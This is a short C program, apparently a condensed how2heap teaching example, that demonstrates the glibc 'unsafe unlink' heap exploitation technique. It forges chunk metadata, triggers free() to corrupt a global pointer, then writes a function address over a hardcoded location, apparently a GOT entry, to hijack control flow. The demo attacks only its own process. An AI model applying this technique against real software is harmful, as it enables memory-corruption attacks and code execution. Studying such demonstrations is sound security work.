/*
 * unsafe_unlink.c
 *
 * condensed version of https://github.com/shellphish/how2heap
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

void babo()
{
    fprintf(stderr, "%s!\n", "Babo");
}

int main()
{
    int malloc_size = 0x80;

    chunk0_ptr = (uint64_t*) malloc(malloc_size);
    uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size);

    fprintf(stderr, "&chunk0_ptr: %p\n", &chunk0_ptr);
    fprintf(stderr, "chunk0_ptr: %p\n", chunk0_ptr);
    fprintf(stderr, "sizeof(size_t): %ld\n", sizeof(size_t));
    fprintf(stderr, "sizeof(uint64_t): %ld\n", sizeof(uint64_t));

    chunk0_ptr[0] = 0;
    chunk0_ptr[1] = sizeof(size_t); // size
    chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3); // fd
    chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2); // bk

    uint64_t *chunk1_hdr = chunk1_ptr;

    // decrease ptr to manipulate chunk1's metadata 
    chunk1_hdr--;
    chunk1_hdr--;

    // forge chunk0 as a freed chunk to induce coalescing (which will do unlink() eventually)
    chunk1_hdr[0] = malloc_size; // decrease chunk size and our forged metadata will be used
    chunk1_hdr[1] &= ~1;

    free(chunk1_ptr);
    
    // now chunk0_ptr points somewhere close to itself.
    // so, we can use it to write itself.
    fprintf(stderr, "chunk0_ptr: %p\n", chunk0_ptr);

    *(chunk0_ptr+3) = 0x601020LL;
    *chunk0_ptr = (uint64_t)babo;

    puts("Done.");

    return 0;
}
